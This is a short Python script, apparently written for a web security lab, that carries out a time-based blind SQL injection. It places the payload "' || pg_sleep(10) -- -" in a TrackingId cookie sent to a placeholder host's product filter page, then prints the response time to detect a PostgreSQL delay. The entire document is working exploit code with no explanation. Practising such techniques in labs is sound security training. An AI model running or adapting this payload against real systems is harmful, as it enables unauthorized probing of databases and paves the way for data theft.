import requests
import re

host = "YOUR_HOST"
path = "/filter?category=Pets"
payload="' || pg_sleep(10) -- -"
cookies={
    "session":"YOUR_SESSION",
    "TrackingId": ""+payload
}

res=requests.get("https://"+host+path,cookies=cookies)
print(res.status_code)
print(res.elapsed.total_seconds())
print(res.text)